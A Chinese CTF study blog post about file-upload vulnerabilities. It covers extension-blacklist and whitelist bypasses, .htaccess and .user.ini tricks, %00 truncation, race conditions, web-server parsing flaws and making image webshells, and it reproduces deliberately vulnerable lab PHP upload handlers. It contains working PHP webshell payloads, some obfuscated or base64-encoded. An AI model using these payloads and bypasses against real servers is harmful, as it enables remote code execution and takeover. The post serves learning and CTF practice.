---
title: 入门文件上传漏洞
published: 2026-05-15
description: 文件上传漏洞学习
image: "./5.jpg"
tags: ["CTF"]
category: CTF
draft: false
slug: uploads
---

再入门文件上传？

之前对文件上传漏洞只是有个大致的了解，但是没怎么写题目，对一些难的绕过也没有涉猎

这里重新系统性的学习了一下文件上传漏洞，加上刷题后的理解，便有了此文

![alt text](mind-map.png)

![alt text](sum_up.png)

## 前端检验

先上传一个正常可上传的文件，再利用 **抓包** 将其后缀名改为恶意文件后缀

也可以尝试 **禁用 Javascript**（前端大部分检测都是依赖 Javascript 所实现的

这里以 Chrome 浏览器为例讲讲如何禁用 Javascript：

1. 点击 URL 栏左侧的调谐器图标
2. 点击其中的“网站设置”
3. 在其中选择 Javascript，改为“禁用”
4. 返回原网页进行刷新


## 后端检测文件类型

这里的检测分为两种：后端检测 `content-type` 和 后端检测文件头

### 后端检测 `content-type`

对于这种检验，我们依旧可以采取抓包修改 `content-type` 后再进行上传的操作

修改 `content-type` 对于我们的文件内容正确执行不会有任何影响

原理：`content-type` 实质也就是一个 http 请求头，且完全是由客户端决定的

常见的 `content-type`：

| 类型            | 描述                                     | 典型示例                                                                                                                                                                           |
| ------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `text`        | 表明文件是普通文本，理论上是人类可读                     | `text/plain`,   <br>`text/html`,   <br>`text/css, text/javascript`                                                                                                             |
| `image`       | 表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型 | `image/gif`,   <br>`image/png`,  <br>`image/jpeg`,   <br>`image/bmp`,   <br>`image/webp`,   <br>`image/x-icon`,   <br>`image/vnd.microsoft.icon`                               |
| `audio`       | 表明是某种音频文件                              | `audio/midi`,   <br>`audio/mpeg,audio/webm,`  <br>`audio/ogg,audio/wav`                                                                                                        |
| `video`       | 表明是某种视频文件                              | `video/webm`, `video/ogg`                                                                                                                                                      |
| `application` | 表明是某种二进制数据                             | `application/octet-stream`,   <br>`application/pkcs12`,   <br>`application/vnd.mspowerpoint`,   <br>`application/xhtml+xml`,   <br>`application/xml`,    <br>`application/pdf` |

### 后端检测文件头

对于这种检测，我们的应对方法是在文件内容前面加上该文件的 **文件签名**

| 类型             | 后缀      | 文件头（文件签名）                                               |
| -------------- | ------- | ------------------------------------------------------- |
| JPEG           | jpg     | FF D8 FF                                                |
| PNG            | png     | 89 50 4E 47 0D 0A 1A 0A                                 |
| GIF            | gif     | 47 49 46 38 37 61 (GIF87a) 或 47 49 46 38 39 61 (GIF89a) |
| XML            | xml     | 3C 3F 78 6D 6C                                          |
| ZIP Archive    | zip     | 50 4B 03 04                                             |
| RAR Archive    | rar     | 52 61 72 21                                             |
| Windows Bitmap | bmp     | 42 4D C0 01                                             |
| TIFF           | tif     | 49 49 2A 00                                             |
| HTML           | html    | 68 74 6D 6C 3E                                          |
| MS Word/Excel  | doc/xls | D0 CF 11 E0                                             |
| RIFF           | webp    | 52 49 46 46                                             |


## 后端检测文件后缀名（黑名单）

### 特殊后缀名绕过

若是后端仅仅黑名单禁止了一些常见的后缀名，这个时候我们可以采用一些比较不常见的后缀名

对于 php：Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml

对于 jsp：jspx|jspf

对于 asp：asa|cer|cdx

对于 aspx：ashx|asmx|ascx

*常见的后端源码：*

一般使用 **匹配** 的方式

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 大小写绕过

对于 Windows 系统，文件拓展名对大小写不敏感；对于 Linux 系统，文件拓展名对大小写敏感

我们可以将后缀进行大写替换

例如：我们有 0n1y.txt 和 0n1y.Txt 这两个文件，在 Windows 系统中它们会被视为同一个文件，而在 Linux 系统中它们会被视为两个不同的文件

*常见的后端源码：*

没有使用函数进行 **小写转换**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 双写绕过

在其他 Web 安全漏洞的学习中，我们知道某些“粗心”的程序员面对一些不安全的字符串会将其替换为空字符串

我们只需要将危险字符串连写多份

例如：后端选择将检测到的 `php` 替换空字符串，这里我们可以构造 `pphphp` 去进行绕过

*常见的后端源码：*

一般使用一些 **替换函数**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 空格绕过

**仅适用于 Windows 系统**

传入后缀带空格的文件，Windows 系统会自动将文件后缀名末尾的空格删除从而进行解析；对于 Linux 系统来说则不行，它会完整的保留那个空格

我们可以在文件后缀加上空格

例如：`0n1y.php` --> `0n1y.php+`（这里的 + 是一个空格）

*常见的后端源码：*

一般使用 **匹配** 的方式

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }

```

### 点绕过

**仅适用于 Windows 系统**

与空格绕过类似，Windows 文件名后缀后加点号会被自动删除，Linux 后缀后空白符后的点号会自动删除，但数据包中可以加上点号，上传后自动删除

我们可以在文件后缀加上点号

例如：`0n1y.php` 写成 `0n1y.php.`

*常见的后端源码：*

一般使用 **匹配** 的方式

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### NTFS文件流(::$DATA)绕过

**仅适用于 Windows 系统**

`::$DATA` 流是 Windows NTFS 文件系统中的一个功能，它允许一个文件拥有多个数据流。创建一个数据交换流文件的方法：`宿主文件:准备与宿主文件关联的数据流文件`

我们可以使用文件名为`文件名+::$DATA`，则会把 `::DATA` 之后的数据当成文件流处理，并不会检测后缀名，且保持 `::$DATA` 之前的文件名（访问文件的时候不需要加上 `::$DATA`

例如：`0n1y.php::$DATA`

*常见的后端源码：*

一般 **没有删除末尾的 `::$DATA`**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### .htaccess绕过

**仅适用于 Apache 服务器**

该文件可以控制同目录下的访问权限和解析设置，若是黑名单未过滤 `.htaccess` 文件的上传，并且允许用户适用自定义的 `.htaccess` 文件，则我们可以使得特定后缀名的文件当成比如 php 文件去执行，或者直接将特定的文件当成 php 文件去执行（修改后不仅能够改变当前目录下的 Apache 配置信息，还能修改其子目录下的配置信息

若要启动 `.htaccess` 配置文件，需要在服务器的主配置文件将 AllowOverride 设置为 All，并且 Apache 加载了 rewrite 模块

一般分为两种指令：`AddType` 和 `SetHandler`

`AddType` 可以将特定的文件扩展名映射到指定的内容类型（即将其他拓展名指定为 php 文件进行解析

`SetHandler` 强制所有匹配的文件由指定的处理器处理（即指定特定文件当作 php 文件进行解析

payload：

```php
<IfModule mime_module>
AddHandler php5-script .gif

SetHandler application/x-httpd-php
</IfModule>
```

```php
<FilesMatch "evil.gif">
SetHandler application/x-httpd-php

AddHandler php5-script .gif
</FilesMatch>
```

```php
<IfModule mime_module>
AddType application/x-httpd-php .gif
</IfModule>
```

### .user.ini绕过

**仅适用于 php 版本>=5.3.0且以 CGI/FastCGI 模式运行的 php**

使用的时候得等到它生效后才能连接比如蚁剑（多等一会

该方式的泛用程度要大于 `.htaccess` 文件的利用（`.htaccess` 只支持 Apache
以 CGI/FastCGI 模式运行的 php 才支持基于每个目录下的 `.ini` 文件，若是开启后，php 便会依照下列顺序去查找 `.ini` 配置（从上到下依次权力变小，即两个 `.ini` 都有同一个配置，会依照 1~4 的顺序去采纳

php 的配置加载机制：
1. 代码中的 `ini.set()`（仅针对该脚本生效
2. 当前目录下的 `.user.ini`（针对当前目录及其子目录生效
3. 上级目录直到根目录的 `.user.ini`
4. 全局的 `php.ini`

`.user.ini` 的两个配置：
```php
auto_append_file=filename //指定一个文件，自动包含在要执行的文件前
auto_prepend_file=filename  //指定一个文件，自动包含在要执行的文件后
```
filename 实际为路径，可以为绝对路径和相对路径

实际使用中我们一般可以先上传一个 `.user.ini`，指定一个后缀在许可范围内的文件名，随后上传包含一句话木马的文件。...等等等...，等到 `.user.ini` 修改配置生效后，访问题目容器下的一个 `.php` 结尾的路径，随后便可利用蚁剑等进行连接

### 伪装文件夹绕过

在数据包中在文件名后面加上 `/.` 将文件伪装成文件夹，最后保存时正常,但检测到的后缀名为 `后缀名/.`（在 `/.` 后面再利用%00.<正常文件格式> 可以绕过白名单）


## 后端检测文件后缀名（白名单）

相对于黑名单绕过，白名单的绕过要更难

### %00截断绕过

要求：PHP版本 < 5.3 且 php.ini 配置文件中 magic_quotes_gpc 为 off 且数据包必须包含上传路径（文件上传路径可控

系统在对文件名的读取时，如果遇到 `0x00`，就会认为读取已结束，从而忽略后面的内容
（%00 是 0x00 的 URL 编码格式）

我们可以将文件上传路径后加上 `%00`，这样的话其后的内容就会被截断

例如：文件原本的上传路径为 `/uploads/随机数.白名单后缀`
这时我们可以将上传路径修改为 `/uploads/0n1y.php%00随机数.白名单后缀`
这样白名单的后缀就不会被解析并且又绕过了白名单检测，我们的文件被当成 `.php` 文件执行

*常见的后端源码：*

一般将 **路径直接拼接**

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```


## 后端检测文件内容

**过滤了 `php`**：使用 `<?=eval($_POST[cmd]);?>`

**过滤了 `[]`**：使用 `<?=eval($_POST{cmd});?>`

**过滤了 `<?`**：**仅在 PHP 版本 < 5.6.X 下才可使用**
使用：
```php
<script language="php">
	eval($_POST[cmd]);
</script>
```
或者使用 UTF-16 编码绕过

**过滤了 `;` 和 `[]`**：使用 `<?=system('tac ../flag.*')?>`

**过滤了敏感字符**（如 `$_GET`）：
使用编码绕过：
`<?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>`

其他绕过：
```php
<?php $_GET['a']($_GET['b']); ?>
a=system&b=ls
a=assert&b=system("ls")

<?php
  $a = str_replace(text,sser,atextt);
  $a($_POST['c']);
?>

<?php 
$a="sys";
$b="tem";
$c=$a.$b;
$c($_POST['c']);
?>

```

## 二次渲染绕过

这里尽量使用 `.gif` 文件（`.gif` 还是太好用了

后端会对我们上传的图片进行二次渲染，从而可能使得我们上传文件中的恶意代码被直接删除

我们可以先上传一张带有恶意代码的图片，随后再将服务器返回给我们的图片与原图进行对比（例如使用 01editor 等等，再在没有发生更改的位置插入我们的恶意代码重新上传即可

*常见的后端源码：*

```php
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```


## 条件竞争

由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致条件竞争漏洞的发生

如果文件可以直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名；如果文件格式不符合要求，将文件删除

由于服务器并发处理多个请求，假如 a 用户上传了木马文件，由于代码执行需要时间，在此过程中 b 用户访问了 a 用户上传的文件，会有以下三种情况：

 1.访问时间点在上传成功之前，没有此文件
    
 2.访问时间点在刚上传成功但还没有进行判断，该文件存在
    
 3.访问时间点在判断之后，文件被删除，没有此文件

这里我们目标就是要抓住服务器删除文件的那个空挡，如果抓住就算是它对文件名进行随机数命名我们也可以成功上传到，且上传过后的文件就是持久的保存在服务器了（因为已经通过了后端的删除检测

我一般是使用 burpsuite 的 intruder 模块，分两个同时进行去访问（线程可以拉高一点，不过可能要冒着报 403 的风险23333

*常见的后端源码：*

```php
```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```


## 解析漏洞

三大巨头来了（（

### Apache httpd 多后缀解析漏洞

Apache 默认一个文件可以有多个以点 `.` 分割的后缀，当右边的后缀名无法识别，则继续向左识别，即它的识别顺序为从右往左

如果服务器的 php 文件处理程序时配置不当，那么所以只要文件含有 `.php` 后缀的文件会被识别成 php 文件，没必要是最后一个后缀

因此，我们可以在 `.php` 后面添加多个无效拓展名，例如 `0n1y.php.hga.fjeoia`

这样服务器解析的还是 `0n1y.php` 文件

### Apache httpd 换行解析漏洞

Apache 会使用正则表达式中的 `$` 用来匹配字符串结位置，但在设置了对象的 Multiline 属性的条件下，`$` 还会匹配到字符串结尾的换行符

也就是说 `$` 会去匹配换行符（LF），`\x0A`转义序列代表的就是换行符，所以在php文件后面加上 `\x0A` 可以进行绕过。在解析php时 `1.php\x0A` 将被按照php文件进行解析

### Nginx 配置不当解析漏洞

当配置项 CGI.fix_pathinfo 开启并且 security.limit_extensions 没有限制解析文件类型时，在上传的文件名后面加上 `/.php`，被解析为 php 文件

上传`/eval.jpg/a.php`，配置文件中的配置项 cgi.fix_pathinfo=1 默认开启（路径修复：如果当前路径不存在则采用上级路径）如果 `a.php` 不存在，FastCGI 就会把上一级的`eval.jpg` 作为php文件解析

### IIS7.5解析漏洞

在 FastCGI 运行模式下，php.ini 里配置项 cgi.fix_pathinfo=1，并且取消勾选 php-cgi.exe 程序的模块映射中的请求限制

在上传的文件名后面加上 `/.php`，可以被作为 php 文件解析，和 Nginx 配置不当解析漏洞类似

### IIS6.0解析漏洞

路径解析：在 `.asp|.asa` 目录下的任意文件都会以asp格式解析

分号截断：IIS6.0 默认不解析 `;` 后面的内容，上传 `eval.asp;.jpg` 会被解析为 asp

解析文件类型：IIS 6.0 默认的可执行文件除了 asp 还包含 `asa|cer|cdx`，会将这三种扩展名文件解析为 asp 文件


## 文件目录位置无法访问

先决条件：上传的压缩文件自动解压

思路: 先上传一个 zip，其中压缩了一个链接到 /var/www/html 的软链接 test。然后，再上传一个 zip，这次的 zip 中含有一个正常的文件夹 test，里面有一句话木马的 php 文件
第一次解压，会在 tmp 目录下产生一个软链接 test。在第二次解压时，因为存在同名的文件(软链接test 和正常文件夹 test)，此时解压程序会将 test 文件夹中的文件试图解压到已经存在的 test中，而这个已经存在的test指向了 /var/www/html，所以实际的解压位置就变成了 /var/www/html

这里再提供一种思路（做题碰到的

若是无法访问上层目录，可以考虑先进行提权（例如寻找 suid 的文件路径等等


## 其他绕过

目前这些还没有碰到题目/不怎么常见

- Unicode： 当目标存在 json_decode 且检查在 json_decode 之前,可以将 php 写为`\u0070hp`
- 名单列表绕过，如：`*.asa` `*.cer`


## 如何构造图片马

这里列举三种方法（按照从易到难的顺序

### GIF

`.gif` 太好用了你知道吗（

直接在文件内容前加上 `GIF89a` 或者 `GIF87a` 即可

### copy

使用如下命令：

`copy 0n.jpg/b + 1y.php/a 0n1y.jpg`

即可得到图片马 `0n1y.jpg`

### 01editor

打开图片，滚动到文件末尾，粘贴比如一句话木马保存即可